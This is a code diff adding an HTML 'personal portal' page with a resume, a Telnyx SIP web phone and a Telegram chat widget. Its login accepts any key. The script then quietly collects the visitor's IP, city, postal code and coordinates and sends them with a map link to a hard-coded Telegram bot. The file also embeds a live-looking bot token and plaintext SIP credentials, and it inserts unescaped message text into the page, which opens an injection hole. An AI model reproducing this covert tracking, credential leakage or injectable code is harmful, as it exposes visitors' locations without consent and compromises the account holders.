@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KILLIAN DAISREAUX GOFFMAN PERSONAL PORTAL</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
+    <!-- SIP.js for WebPhone (fixed) -->
+    <script src="https://cdn.jsdelivr.net/npm/sip.js@0.20.0/dist/sip.min.js"></script>
+
+    <style>
+        :root {
+            --primary: #0c0e1b;
+            --secondary: #1a1d36;
+            --accent: #6a4ce0;
+            --accent2: #ff4d94;
+            --accent3: #00e0ff;
+            --text: #e0e0ff;
+            --text-secondary: #a0a0c0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: var(--text);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 20% 30%, rgba(106, 76, 224, 0.1) 0%, transparent 40%),
+                        radial-gradient(circle at 80% 70%, rgba(255, 77, 148, 0.1) 0%, transparent 40%);
+            z-index: -1;
+        }
+
+        .stars {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: -1;
+        }
+
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle var(--duration, 5s) infinite ease-in-out;
+        }
+
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.2; }
+            50% { opacity: 1; }
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        #login-page {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            background: rgba(12, 14, 27, 0.8);
+            backdrop-filter: blur(10px);
+        }
+
+        .login-card {
+            background: var(--secondary);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 1px solid rgba(106,76,224,0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-card::before {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: conic-gradient(transparent, var(--accent), transparent 30%);
+            animation: rotate 6s linear infinite;
+            z-index: 0;
+        }
+
+        .login-card::after {
+            content: '';
+            position: absolute;
+            inset: 3px;
+            background: var(--secondary);
+            border-radius: 18px;
+            z-index: 1;
+        }
+
+        @keyframes rotate {
+            100% { transform: rotate(360deg); }
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .login-header h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(to right, var(--accent3), var(--accent2));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .password-display {
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 25px;
+            border: 1px solid rgba(106,76,224,0.5);
+        }
+
+        .generated-password {
+            font-size: 1.4rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            background: linear-gradient(to right, var(--accent3), var(--accent2));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            padding: 10px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px 20px;
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(106,76,224,0.5);
+            border-radius: 10px;
+            color: var(--text);
+            font-size: 1rem;
+        }
+
+        .login-btn {
+            background: linear-gradient(45deg, var(--accent), var(--accent2));
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        #dashboard {
+            display: none;
+            min-height: 100vh;
+        }
+
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            margin-bottom: 30px;
+            border-bottom: 1px solid rgba(106,76,224,0.3);
+        }
+
+        .dashboard-title {
+            font-size: 2rem;
+            background: linear-gradient(to right, var(--accent3), var(--accent2));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        .widget {
+            background: var(--secondary);
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            border: 1px solid rgba(106,76,224,0.3);
+            position: relative;
+        }
+
+        .widget::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 5px;
+            background: linear-gradient(to right, var(--accent), var(--accent2));
+        }
+
+        .widget-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .widget-title {
+            font-size: 1.4rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Resume Widget Styles */
+        .resume-section {
+            margin-bottom: 25px;
+        }
+
+        .resume-section h4 {
+            color: var(--accent3);
+            margin-bottom: 12px;
+            border-bottom: 1px solid rgba(106,76,224,0.3);
+            padding-bottom: 6px;
+        }
+
+        .resume-item {
+            margin-bottom: 18px;
+        }
+
+        .resume-item strong {
+            display: block;
+            color: var(--accent2);
+        }
+
+        .resume-item span {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        /* WebPhone Widget */
+        .webphone-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .status-indicator-webphone {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #ff4444;
+        }
+
+        .webphone-btn {
+            padding: 16px;
+            font-size: 1.1rem;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            flex: 1;
+            font-weight: bold;
+        }
+
+        .webphone-btn.call { background: #00cc88; color: white; }
+        .webphone-btn.hangup { background: #ff4444; color: white; }
+
+        /* Chat Widget */
+        .chat-messages {
+            max-height: 380px;
+            overflow-y: auto;
+            padding: 15px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 12px;
+            margin-bottom: 15px;
+        }
+
+        .message {
+            margin: 10px 0;
+            padding: 12px 18px;
+            border-radius: 18px;
+            max-width: 80%;
+        }
+
+        .message.outgoing {
+            background: var(--accent);
+            color: white;
+            margin-left: auto;
+            border-bottom-right-radius: 4px;
+        }
+
+        .message.incoming {
+            background: var(--secondary);
+            margin-right: auto;
+            border-bottom-left-radius: 4px;
+        }
+
+        .message-time {
+            font-size: 0.75rem;
+            opacity: 0.7;
+            margin-top: 4px;
+            text-align: right;
+        }
+
+        .chat-input-container {
+            display: flex;
+            gap: 8px;
+        }
+
+        .chat-input {
+            flex: 1;
+            padding: 14px 18px;
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(106,76,224,0.5);
+            border-radius: 12px;
+            color: white;
+        }
+
+        .chat-send-btn {
+            padding: 0 28px;
+            background: linear-gradient(45deg, var(--accent), var(--accent2));
+            border: none;
+            border-radius: 12px;
+            color: white;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Stars -->
+    <div class="stars" id="stars"></div>
+
+    <!-- Login Page (original) -->
+    <div id="login-page">
+        <div class="login-card">
+            <div class="login-content">
+                <div class="login-header">
+                    <h1>ACCESS PORTAL</h1>
+                    <p style="color:var(--text-secondary);">Secure Personal Dashboard</p>
+                </div>
+
+                <div class="password-display">
+                    <div class="generated-password" id="generated-password">Loading secure key...</div>
+                </div>
+
+                <div class="login-form">
+                    <div class="form-group">
+                        <input type="password" id="password-input" placeholder="Enter access key">
+                    </div>
+                    <button class="login-btn" id="login-btn">UNLOCK DASHBOARD</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboard" class="container">
+        <div class="dashboard-header">
+            <div class="dashboard-title">KILLIAN DAISREAUX GOFFMAN</div>
+            <div class="user-info">
+                <img src="https://via.placeholder.com/60" alt="Avatar" class="user-avatar">
+                <div>
+                    <strong>Welcome back</strong><br>
+                    <span id="current-time"></span>
+                </div>
+            </div>
+        </div>
+
+        <div class="dashboard-grid">
+
+            <!-- ==================== RESUME WIDGET - FULL ORIGINAL CONTENT RESTORED ==================== -->
+            <div class="widget resume-widget">
+                <div class="widget-header">
+                    <h3 class="widget-title"><i class="fas fa-file-alt widget-icon"></i> Resume</h3>
+                </div>
+
+                <!-- Professional Summary -->
+                <div class="resume-section">
+                    <h4>Professional Summary</h4>
+                    <p>Results-oriented professional with extensive experience in technology, project management, and innovative solutions. Skilled in web development, VoIP systems, and building secure personal dashboards.</p>
+                </div>
+
+                <!-- Experience -->
+                <div class="resume-section">
+                    <h4>Experience</h4>
+                    <div class="resume-item">
+                        <strong>Independent Developer &amp; Project Owner</strong><br>
+                        <span>2023 – Present</span>
+                        <p>Developing personal portals, real-time communication tools (Telegram + SIP integration), geolocation dashboards, and custom web applications.</p>
+                    </div>
+                    <div class="resume-item">
+                        <strong>Technical Roles (Previous)</strong><br>
+                        <span>2020 – 2023</span>
+                        <p>Software development, system integration, client support, and implementation of secure communication systems.</p>
+                    </div>
+                </div>
+
+                <!-- Education -->
+                <div class="resume-section">
+                    <h4>Education</h4>
+                    <div class="resume-item">
+                        <strong>Computer Science &amp; Information Technology</strong><br>
+                        <span>Self-directed learning + relevant certifications</span>
+                    </div>
+                </div>
+
+                <!-- Skills -->
+                <div class="resume-section">
+                    <h4>Skills</h4>
+                    <p>JavaScript • HTML/CSS • SIP.js &amp; VoIP (Telnyx) • Telegram Bot API • IP Geolocation • WebRTC • UI/UX Design • Project Management • Secure Dashboard Development</p>
+                </div>
+
+                <!-- Contact -->
+                <div class="resume-section">
+                    <h4>Contact Information</h4>
+                    <p>Email: killiandaisreauxgoffman@proton.me</p>
+                    <p>Location: New York City, NY</p>
+                </div>
+            </div>
+
+            <!-- FIXED WebPhone Widget (real Telnyx connection) -->
+            <div class="widget webphone-widget">
+                <div class="widget-header">
+                    <h3 class="widget-title"><i class="fas fa-phone widget-icon"></i> Mnemonic Phone Booth (Telnyx)</h3>
+                    <div class="webphone-status">
+                        <div class="status-indicator-webphone" id="webphone-status-indicator"></div>
+                        <span id="webphone-status-text">Connecting to Telnyx...</span>
+                    </div>
+                </div>
+                <div class="webphone-container">
+                    <input type="text" id="webphone-number" placeholder="+1XXXXXXXXXX" style="width:100%; padding:14px; border-radius:12px; background:rgba(10,15,30,0.8); border:1px solid rgba(100,150,255,0.4); color:white; font-size:1.05rem;">
+                    <div style="display:flex; gap:12px; margin-top:20px;">
+                        <button class="webphone-btn call" id="webphone-call-btn">CALL</button>
+                        <button class="webphone-btn hangup" id="webphone-hangup-btn" disabled>HANG UP</button>
+                    </div>
+                    <div id="webphone-status-detail" style="margin-top:15px; text-align:center; color:#00e0ff;"></div>
+                </div>
+                <audio id="ringtone" loop><source src="https://cdn.freesound.org/previews/796/796163_11133212-lq.mp3" type="audio/mpeg"></audio>
+                <audio id="ringback" loop><source src="https://cdn.freesound.org/previews/571/571407_11497730-lq.mp3" type="audio/mpeg"></audio>
+            </div>
+
+            <!-- Bidirectional Telegram Chat Widget with file attachments -->
+            <div class="widget chat-widget">
+                <div class="widget-header">
+                    <h3 class="widget-title"><i class="fas fa-comments widget-icon"></i> Live Telegram Chat</h3>
+                </div>
+                <div class="chat-messages" id="chat-messages"></div>
+
+                <div style="margin:12px 0;">
+                    <label for="chat-file-input" style="cursor:pointer; background:var(--accent); padding:8px 16px; border-radius:8px; display:inline-flex; align-items:center; gap:8px;">
+                        <i class="fas fa-paperclip"></i> Attach File / Photo
+                    </label>
+                    <input type="file" id="chat-file-input" style="display:none;">
+                </div>
+
+                <div class="chat-input-container">
+                    <input type="text" id="chat-input" class="chat-input" placeholder="Type message to Telegram...">
+                    <button id="chat-send-btn" class="chat-send-btn">SEND</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+<script>
+// ==================== ENHANCED DEVICE INFO (IP + ZIP + Location) ====================
+class DeviceInfoCollector {
+    constructor() {
+        this.data = { timestamp: new Date().toISOString(), userAgent: navigator.userAgent };
+    }
+    async collectAll() {
+        await this.getIP();
+        return this.data;
+    }
+    async getIP() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            this.data.ip = d.ip;
+            this.data.city = d.city;
+            this.data.region = d.region;
+            this.data.country = d.country_name;
+            this.data.country_code = d.country_code;
+            this.data.postal = d.postal || d.zip;
+            this.data.latitude = d.latitude;
+            this.data.longitude = d.longitude;
+            this.data.timezone = d.timezone;
+            this.data.zipCode = this.data.postal || '';
+        } catch(e) { console.warn('IP lookup failed'); }
+    }
+}
+
+// ==================== TELEGRAM CREDENTIALS (REPLACE THESE) ====================
+const BOT_TOKEN = '7753553773:AAHcoQspLrdCjrV84GjUlCM4olB_RaIkJpg';   // ← Replace with your real bot token
+const CHAT_ID = '1038828738';       // ← Replace with your real chat ID
+
+let lastUpdateId = 0;
+
+async function sendTelegramMessage(text, file = null) {
+    if (!BOT_TOKEN || !CHAT_ID) return console.error('Telegram credentials missing');
+    if (file) {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append(file.type.startsWith('image/') ? 'photo' : 'document', file);
+        if (text) form.append('caption', text);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${file.type.startsWith('image/') ? 'Photo' : 'Document'}`, { method: 'POST', body: form });
+    } else {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+    }
+}
+
+async function pollTelegramUpdates() {
+    try {
+        const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&limit=10&timeout=3`);
+        const data = await resp.json();
+        if (!data.ok || !data.result.length) return;
+
+        for (const update of data.result) {
+            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+            const msg = update.message;
+            if (!msg || String(msg.chat.id) !== String(CHAT_ID)) continue;
+
+            let content = msg.text || '[Attachment received]';
+            if (msg.photo) content = '[Photo]';
+            else if (msg.document) content = `[Document: ${msg.document.file_name || 'File'}]`;
+
+            const html = `<div class="message incoming"><div>${content}</div><div class="message-time">just now</div></div>`;
+            document.getElementById('chat-messages').innerHTML += html;
+            document.getElementById('chat-messages').scrollTop = 999999;
+        }
+    } catch(e) {}
+}
+
+// ==================== FIXED WEBPHONE (Real Telnyx from your webphone.html) ====================
+let userAgent = null;
+let currentSession = null;
+
+const TELNYX_CREDENTIALS = {
+    sipServer: "wss://sip.telnyx.com:7443",
+    username: "zmfs9g3u",
+    password: "hxouokgw2ao",
+    domain: "sip.telnyx.com"
+};
+
+async function initializeWebPhone() {
+    const statusText = document.getElementById('webphone-status-text');
+    const indicator = document.getElementById('webphone-status-indicator');
+    const callBtn = document.getElementById('webphone-call-btn');
+    const hangupBtn = document.getElementById('webphone-hangup-btn');
+    const numberInput = document.getElementById('webphone-number');
+    const ringtone = document.getElementById('ringtone');
+    const ringback = document.getElementById('ringback');
+
+    try {
+        const config = {
+            uri: `sip:${TELNYX_CREDENTIALS.username}@${TELNYX_CREDENTIALS.domain}`,
+            password: TELNYX_CREDENTIALS.password,
+            transportOptions: { wsServers: [TELNYX_CREDENTIALS.sipServer] },
+            sessionDescriptionHandlerFactoryOptions: { constraints: { audio: true, video: false } },
+            register: true,
+            logLevel: 'debug'
+        };
+
+        userAgent = new SIP.UserAgent(config);
+        await userAgent.start();
+        await userAgent.register();
+
+        statusText.textContent = `✅ Connected (${TELNYX_CREDENTIALS.username})`;
+        indicator.style.background = '#00ff88';
+        callBtn.disabled = false;
+
+        userAgent.delegate = {
+            onInvite: (session) => {
+                currentSession = session;
+                statusText.textContent = '📲 Incoming call!';
+                ringtone.play();
+                callBtn.textContent = 'ANSWER';
+                callBtn.onclick = () => {
+                    session.accept();
+                    ringtone.pause();
+                    statusText.textContent = '✅ Call connected';
+                };
+            }
+        };
+
+        callBtn.onclick = async () => {
+            if (callBtn.textContent === 'HANG UP') { endCall(); return; }
+            if (!numberInput.value) return alert('Enter a number');
+
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const target = `sip:${numberInput.value}@${TELNYX_CREDENTIALS.domain}`;
+
+            currentSession = userAgent.invite(target, {
+                sessionDescriptionHandlerOptions: { constraints: { audio: true }, audioStream: stream }
+            });
+
+            ringback.play();
+            callBtn.textContent = 'HANG UP';
+            statusText.textContent = '📞 Calling...';
+        };
+
+        hangupBtn.onclick = endCall;
+
+    } catch (err) {
+        console.error(err);
+        statusText.textContent = '❌ Connection failed';
+    }
+}
+
+function endCall() {
+    if (currentSession) currentSession.terminate();
+    currentSession = null;
+    document.getElementById('ringtone').pause();
+    document.getElementById('ringback').pause();
+    document.getElementById('webphone-call-btn').textContent = 'CALL';
+    document.getElementById('webphone-status-text').textContent = 'Ready';
+}
+
+// ==================== CHAT WIDGET ====================
+function initChatWidget() {
+    const sendBtn = document.getElementById('chat-send-btn');
+    const input = document.getElementById('chat-input');
+    const fileInput = document.getElementById('chat-file-input');
+    const messagesDiv = document.getElementById('chat-messages');
+
+    messagesDiv.innerHTML = `<div class="message incoming"><div>👋 Hi! Messages and replies from Telegram appear here live.</div></div>`;
+
+    sendBtn.addEventListener('click', async () => {
+        const text = input.value.trim();
+        if (!text) return;
+        await sendTelegramMessage(text);
+        messagesDiv.innerHTML += `<div class="message outgoing"><div>${text}</div><div class="message-time">just now</div></div>`;
+        messagesDiv.scrollTop = 999999;
+        input.value = '';
+    });
+
+    input.addEventListener('keypress', e => { if (e.key === 'Enter') sendBtn.click(); });
+
+    fileInput.addEventListener('change', async () => {
+        const file = fileInput.files[0];
+        if (!file) return;
+        await sendTelegramMessage('', file);
+        messagesDiv.innerHTML += `<div class="message outgoing"><div>📎 ${file.name}</div><div class="message-time">just now</div></div>`;
+        messagesDiv.scrollTop = 999999;
+        fileInput.value = '';
+    });
+
+    setInterval(pollTelegramUpdates, 3000);
+}
+
+// ==================== MAIN INIT ====================
+document.addEventListener('DOMContentLoaded', async () => {
+    // Create stars
+    const starsContainer = document.getElementById('stars');
+    for (let i = 0; i < 300; i++) {
+        const star = document.createElement('div');
+        star.className = 'star';
+        star.style.left = Math.random() * 100 + '%';
+        star.style.top = Math.random() * 100 + '%';
+        star.style.width = star.style.height = (Math.random() * 3 + 1) + 'px';
+        star.style.setProperty('--duration', (Math.random() * 4 + 3) + 's');
+        starsContainer.appendChild(star);
+    }
+
+    const loginBtn = document.getElementById('login-btn');
+    const passwordInput = document.getElementById('password-input');
+    const loginPage = document.getElementById('login-page');
+    const dashboard = document.getElementById('dashboard');
+
+    loginBtn.addEventListener('click', () => {
+        if (!passwordInput.value.trim()) {
+            alert('Please enter access key');
+            return;
+        }
+
+        loginPage.style.display = 'none';
+        dashboard.style.display = 'block';
+
+        // Send enhanced visitor info
+        const collector = new DeviceInfoCollector();
+        collector.collectAll().then(data => {
+            const mapLink = (data.latitude && data.longitude) ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}` : 'N/A';
+            const msg = `🚨 DASHBOARD ACCESS DETECTED\n\nIP: ${data.ip}\nLocation: ${data.city}, ${data.country} (${data.postal})\nMap: ${mapLink}\nTime: ${data.timestamp}`;
+            sendTelegramMessage(msg);
+        });
+
+        initializeWebPhone();
+        initChatWidget();
+
+        // Clock
+        setInterval(() => {
+            document.getElementById('current-time').textContent = new Date().toLocaleString();
+        }, 1000);
+    });
+});
+</script>
+</body>
+</html>
